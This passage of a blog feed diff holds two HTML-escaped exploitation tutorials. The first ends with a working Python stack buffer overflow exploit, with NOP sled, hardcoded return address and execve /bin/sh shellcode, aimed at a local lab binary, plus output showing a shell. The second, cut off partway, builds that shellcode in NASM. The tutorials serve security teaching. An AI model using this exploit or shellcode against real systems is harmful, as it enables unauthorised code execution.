+    &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;nops&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x90&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;int2hexstr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;num&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;intsize&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;intsize&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;num&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;num&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;num&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;num&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;l&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;num&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;L&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;num&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;i2hs&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;int2hexstr&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;list2hexstr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;intlist&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;intsize&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;intlist&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;isinstance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;int2hexstr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;intsize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;l2hs&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;list2hexstr&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;exploit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vuln&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;padding&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;76&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;padding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+ 
+    &lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+       &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+       &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xc9\x89\xca\x6a\x0b\x58\xcd\x80&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;int2hexstr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xbffff46c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;nops&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;500&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# put your payload here&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;list2hexstr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vuln&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;env&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;PEDA&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nops&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()}&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;resource&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setrlimit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;resource&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RLIMIT_STACK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;resource&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setrlimit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;resource&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RLIMIT_CORE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;execve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vuln&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;env&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;__main__&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;usage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;exploit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Lets run it !!!!&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  $ ./exploit.py ./vuln
+  Illegal instruction (core dumped)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;Why did this core dump? Well more likely that the address for our shellcode is
+now wrong because we were running in gdb before. Luckily it has core dumped and
+left a core file around so lets open this up in gdb&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  $ gdb ./vuln ./core
+  gedb-peda$ stack
+  Warning: not running or target is remote
+  0000| 0xbffff820 (nop)
+  0004| 0xbffff824 (nop)
+  0008| 0xbffff828 (nop)
+  0012| 0xbffff82c (nop)
+  0016| 0xbffff830 (nop)
+  0020| 0xbffff834 (nop)
+  0024| 0xbffff838 (nop)
+  0028| 0xbffff83c (nop)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;As you can see the address is different we adjust this script to point to
+0xbffff83c instead (the parameter to int2hexstr) and lets see how that works out&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  $ ./exploit.py ./vuln
+  AAAAAAAAAAAA.............
+  $
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;Nice!! we ended up with a shell (those running bash will have seen their prompt
+change&lt;/p&gt;
+
+&lt;p&gt;Level 1 complete! Next up what happens when we cant execute code from the
+stack!!!!&lt;/p&gt;
+
+&lt;p&gt;Update!!: You may have noticed previously that when the crash occured the ESP
+register was pointing to our NOP sled already. If the binary has a “jmp esp” in an
+executable area of memory you could have used the address of this jmp esp as the
+return address. This has the effect of making the exploit more reliable as the
+address of the shellcode no longer matters as ESP always points to our buffer&lt;/p&gt;
+</description>
+				<pubDate>Thu, 03 Nov 2016 17:00:00 +0000</pubDate>
+				<link>https://bad-hombres.github.io//blog/2016/11/03/Buffer-Overflow-Level-1.html</link>
+				<guid isPermaLink="true">https://bad-hombres.github.io//blog/2016/11/03/Buffer-Overflow-Level-1.html</guid>
+			</item>
+		
+			<item>
+				<title>Crafting Shellcode</title>
+				<description>&lt;h1 id=&quot;intro&quot;&gt;Intro&lt;/h1&gt;
+&lt;p&gt;Right! Let me start off by saying that this is not going to be and assembly code
+primer. This is just intended to a brief intro into the mindset needed to craft
+shellcode. There are blogs and resources more comprehensive than this post that
+explain things in greater detail, one such book is the &lt;a href=&quot;https://www.amazon.co.uk/Shellcoders-Handbook-Discovering-Exploiting-Security/dp/047008023X&quot;&gt;Shellcoders
+Handbook&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;This is just going to be a whrilwind tour, at the end of which you’ll have a
+highlevel view of the thought process that goes into crafting shellcode.&lt;/p&gt;
+
+&lt;h1 id=&quot;syscalls&quot;&gt;Syscalls&lt;/h1&gt;
+&lt;p&gt;In linux (IA32) syscalls are generally called by placing the syscall number in
+the EAX register and then putting parameters in EBX, ECX and EDX with the return
+value being placed back in EAX. The kernel is then instructed to execute the
+call bu triggering the 0x80 interupt&lt;/p&gt;
+
+&lt;p&gt;How do we find these syscall numbers? Well these are listed in the include file
+unistd_32.h&lt;/p&gt;
+
+&lt;p&gt;On the vm I prepared (snag the vagrant file from the Vagrant post) they are in&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  $ cat /usr/include/i386-linux-gnu/asm/unistd_32.h | head -20
+  #ifndef _ASM_X86_UNISTD_32_H
+  #define _ASM_X86_UNISTD_32_H
+
+  /*
+   * This file contains the system call numbers.
+   */
+
+  #define __NR_restart_syscall      0
+  #define __NR_exit		  1
+  #define __NR_fork		  2
+  #define __NR_read		  3
+  #define __NR_write		  4
+  #define __NR_open		  5
+  #define __NR_close		  6
+  #define __NR_waitpid		  7
+  #define __NR_creat		  8
+  #define __NR_link		  9
+  #define __NR_unlink		 10
+  #define __NR_execve		 11
+  #define __NR_chdir		 12
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;We are going to write some shellcode which will call the execve syscall which is
+number 11.&lt;/p&gt;
+
+&lt;h1 id=&quot;information-gathering&quot;&gt;Information Gathering&lt;/h1&gt;
+&lt;p&gt;We have our first piece of infomation, 11 is the number for the execve syscall.
+The next piece of info we need is what parameters does execve expect. To find
+this out we turn to the man pages.&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  $ man execve
+  NAME
+         execve - execute program
+
+  SYNOPSIS
+         #include &amp;lt;unistd.h&amp;gt;
+
+         int execve(const char *filename, char *const argv[],
+                    char *const envp[]);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;As you can see it takes a string which is the file to execute (which is going to
+be /bin/sh in our example) then it takes an argument array and then an array
+containing the environment (which will be NULL for our purposes).&lt;/p&gt;
+
+&lt;p&gt;To recap our arguments are going to be&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;/bin/sh&lt;/li&gt;
+  &lt;li&gt;[/bin/sh, 0x0]&lt;/li&gt;
+  &lt;li&gt;0x0
+You may be thinking why the arguments array contains a reference to /bin/sh
+again? Well remember from your C days that argv[0] is the program name itself!.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;So with that information in mind to think of this call in assembly below is how
+we want the registers to end up right before we call the int 0x80 to trigger the
+call&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;EAX: 11 (execve syscall)&lt;/li&gt;
+  &lt;li&gt;EBX: Address of string /bin/sh&lt;/li&gt;
+  &lt;li&gt;ECX: Address of Array containing [/bin/sh, 0x0]&lt;/li&gt;
+  &lt;li&gt;EDX; Address pinting to a 0z0&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;limitations&quot;&gt;Limitations&lt;/h1&gt;
+&lt;p&gt;When generating shellcode we have a few restrictions.&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;We want the shellcode as small as possible, so we tend to reuse data already
+setup&lt;/li&gt;
+  &lt;li&gt;We dont want any NULL bytes as they usually cause problems (as 0x0
+terminsates strings etc)&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;With that in mind lets continue&lt;/p&gt;
+
+&lt;h1 id=&quot;on-to-the-source&quot;&gt;On to the source&lt;/h1&gt;
+&lt;p&gt;First I would like to point out I’m using NASM here which uses intel style
+assembly.&lt;/p&gt;
+
+&lt;p&gt;First we’ll get the string /bin/sh on the stack. Now it will take less
+instructions to get 8 bytes onto the stack than 7 (the current length of
+/bin/sh) so to get around this we’ll put the string //bin/sh on the stack (try
+this out linux doesnt care about the extra /)&lt;/p&gt;
+
+&lt;p&gt;We have to put the string on in reverse order so we start with the null
+terminator&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-nasm&quot; data-lang=&quot;nasm&quot;&gt;  &lt;span class=&quot;k&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;  &lt;span class=&quot;c&quot;&gt;; zero out eax&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;      &lt;span class=&quot;c&quot;&gt;; push the 0x0 on the stack&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;we now have the null terminator on the stack so now lets get the rest of the
+string. We’ll use python to get the hex value for this&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  $ python -c 'print &quot;//bin/sh&quot;[::-1].encode(&quot;hex&quot;)'
+  68732f6e69622f2f
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;So we split this in half and then push it onto the stack&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-nasm&quot; data-lang=&quot;nasm&quot;&gt;  &lt;span class=&quot;k&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x68732f6e&lt;/span&gt;   &lt;span class=&quot;c&quot;&gt;; push the first half to the stack&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x69622f2f&lt;/span&gt;   &lt;span class=&quot;c&quot;&gt;; push the second half of the stack&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ebx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;esp&lt;/span&gt;      &lt;span class=&quot;c&quot;&gt;; move the address of the stack pointer to ebx (1st&lt;/span&gt;
+                    &lt;span class=&quot;c&quot;&gt;; parameter to execve&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Now we can do two things next&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;Push the 0x0 onto the stack that we can use for the 3rd parameter (address of
+which will go into EDX)&lt;/li&gt;
+  &lt;li&gt;We can use the address stored in EBX (the address //bin/sh string) as the
+value of ECX&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Point 2 easy to see if you visualize the stack&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Top                 Bottom of Stack
+0x00000000 //bin/sh 0x00000000
+EDX        EBX
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;So now if we point ECX to the address of the //bin/sh string we have our array&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-nasm&quot; data-lang=&quot;nasm&quot;&gt;  &lt;span class=&quot;k&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;eax&lt;/span&gt;      &lt;span class=&quot;c&quot;&gt;; push 0x0 on the stack&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;edx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;esp&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;; move the address of 0x0 to the 3rd param&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ebx&lt;/span&gt;      &lt;span class=&quot;c&quot;&gt;; push the address of //bin/sh on the stack&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;ecx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;esp&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;; move the address of the address of //bin/sh into ecx&lt;/span&gt;
+                &lt;span class=&quot;c&quot;&gt;; which is our secong parameter&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;All that is left to do is to make the call&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-nasm&quot; data-lang=&quot;nasm&quot;&gt;  &lt;span class=&quot;k&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;al&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;11&lt;/span&gt;  &lt;span class=&quot;c&quot;&gt;; move 11 into EAX (execve call is number 11)&lt;/span&gt;
